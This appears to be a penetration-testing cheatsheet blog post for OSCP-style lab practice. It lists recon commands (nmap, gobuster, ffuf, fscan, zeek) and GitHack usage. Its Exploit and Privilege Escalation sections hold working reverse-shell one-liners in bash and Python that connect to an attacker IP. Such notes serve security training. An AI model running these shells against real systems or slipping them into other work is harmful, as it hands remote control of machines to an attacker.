---
title : "Cheatsheet"
author: imdang 🤞🤞
date: 2024-10-22 11:30:00 +0800
categories: [Cheatsheet]
tags: [nmap,gobuster,ffuf,jadx,linpeas,dnspy,zeek,OSCP]
---

<!-- ![image](https://user-images.githubusercontent.com/59029171/139866885-bc8556d4-7979-4d42-9d4e-027c0900f245.png) -->

<!-- **Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three other unintended ways.** -->

---

# Recon

## Scan

### Nmap

```shell
nmap -sV -sC --min-rate=1000 -p- <IP> -o nmap
```

### Gobuster



```shell
Dirsearch
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP/DNS>
Break status code
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP/DNS> -b <BREAK_STATUSCODE>
```

### ffuf

```shell
Subdomain search
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H “Host: FUZZ.site.com” -u http://site.com
```

### fscan
Scan host in network
Shadow1ng/fscan (github.com)
```shell
./fscan -h 172.0.0.1/24
```

### Zeek with pcap
```shell
zeek -Cr 0.pcap
```
However password in zeek is <hidden> to config for zeek to show in [Ippsec-Cap](https://www.youtube.com/watch?v=O_z6o2xuvlw)

### SSH Port Forwarding

```shell
ssh -L <PORT IN LOCAL>:<IP>:<PORT IN SERVER> username@<IP SERVER>
```

# Exploit

### Bash reverse shell

```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'
```

### Python reverse shell

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.30",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
### Stable reverse shell
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### GitHack - Exploit ```.git``` 
 lijiejie/GitHack: Khai thác tiết lộ thư mục `.git` (github.com)
```shell
Githack
python GitHack.py http://site.htb/.git/
```
### Hash Identifier
``` shell 
hash-identifier  
┌──(kali㉿kali)-[~/TCM/TCM03_Academy]
└─$ hash-identifier            
/usr/share/hash-identifier/hash-id.py:13: SyntaxWarning: invalid escape sequence '\ '
  logo='''   #########################################################################
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH:
```
# Privilege Escalation 

### Check sudo file permissions

```shell
sudo -l
```
### Tools
- linpeas
- pspy - https://github.com/DominicBreuker/pspy - Show all process run in linux 

### Reverse shell
```shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

# Reverse Tools

## C# and .NET
- [*dnSpy*](https://github.com/dnSpy/dnSpy)
![image](https://raw.githubusercontent.com/ficstkeyfx/ficstkeyfx.github.io/refs/heads/main/.github/images/20241113_reverse_tearordear_username.png)
# Other Tools

If you find my articles interesting, you can buy me a coffee 

<a href="https://www.buymeacoffee.com/0xStarlight"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&emoji=&slug=0xStarlight&button_colour=b86e19&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
